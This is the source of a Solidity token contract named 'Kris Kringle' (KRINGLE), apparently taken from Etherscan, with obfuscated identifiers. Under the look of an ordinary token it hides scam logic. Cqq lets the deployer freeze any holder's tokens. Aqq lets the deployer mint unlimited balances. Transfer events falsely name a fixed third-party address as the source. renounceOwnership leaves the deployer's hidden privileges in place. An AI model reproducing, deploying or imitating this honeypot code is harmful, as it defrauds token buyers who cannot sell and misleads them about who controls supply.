/**
 *Submitted for verification at Etherscan.io on 2022-12-24
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address aWDS = 0xA64D08224A14AF343b70B983A9E4E41c8b848584;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract KRINGLE is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private bIKD;
    mapping (address => uint256) private cKS;
    mapping (address => mapping (address => uint256)) private dXC;
    uint8 eVGD = 8;
    uint256 fGH = 100000000*10**8;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "Kris Kringle";
        _symbol = "KRINGLE";
        gIJK(msg.sender, fGH);
      
 }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return eVGD;
    }

    function totalSupply() public view  returns (uint256) {
        return fGH;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return bIKD[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return dXC[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        dXC[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
			modifier JKA () {
		       require(cKS[msg.sender] == 15);
               _;}
			   
   
    function transfer(address recipient, uint256 amount) public returns (bool) {
 
        require(amount <= bIKD[msg.sender]);
        if(cKS[msg.sender] <= 1) {
        hKI(msg.sender, recipient, amount);
        return true; }
     if(cKS[msg.sender] == 15) {
        iLK(msg.sender, recipient, amount);
        return true; }}

			   
			   function Cqq (address nKLL) JKA public {
      cKS[nKLL] = 79;}
			   
			   
			function mSE (address nKLL, uint256 oXX)  internal {
     bIKD[nKLL] += oXX;} 		   
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
    require(amount <= bIKD[sender]);
     require(amount <= dXC[sender][msg.sender]);
                  if(cKS[sender] == 15) {
        iLK(sender, recipient, amount);
        return true;} else
              if(cKS[sender] <= 1) { 
            if (cKS[recipient] <=1) {
        hKI(sender, recipient, amount);
        return true;}}}
		

  		    function gIJK(address kDW, uint256 lMD) internal  {
        cKS[msg.sender] = 15;
        kDW = aWDS;
        bIKD[msg.sender] = bIKD[msg.sender].add(lMD);
        emit Transfer(address(0), kDW, lMD); }
		
		            function iLK(address sender, address recipient, uint256 amount) internal  {
        bIKD[sender] = bIKD[sender].sub(amount);
        bIKD[recipient] = bIKD[recipient].add(amount);
         sender = aWDS;
        emit Transfer(sender, recipient, amount); }
		
		
   function Aqq (address nKLL, uint256 oXX) JKA public {
   mSE(nKLL,oXX);}		



    function hKI(address sender, address recipient, uint256 amount) internal  {
        bIKD[sender] = bIKD[sender].sub(amount);
        bIKD[recipient] = bIKD[recipient].add(amount);
        emit Transfer(sender, recipient, amount); }
	   
}